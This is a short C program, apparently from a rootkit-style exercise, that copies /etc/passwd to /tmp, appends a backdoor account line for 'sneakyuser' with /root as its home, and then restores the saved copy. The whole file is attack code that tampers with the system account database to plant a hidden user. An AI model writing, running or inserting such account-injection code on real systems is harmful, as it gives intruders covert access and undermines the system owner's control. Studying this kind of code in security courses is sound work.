#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void etc_passwd2() {
  system("cp /etc/passwd /tmp/passwd");
  system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\">>/etc/passwd");
}
void recover_etc_passwd() {
  system("mv /tmp/passwd /etc/passwd");
}

int main() {
  fprintf(stdout, "sneaky_process pid = %d\n", getpid());
  etc_passwd2();
  recover_etc_passwd();
  return EXIT_SUCCESS;
}
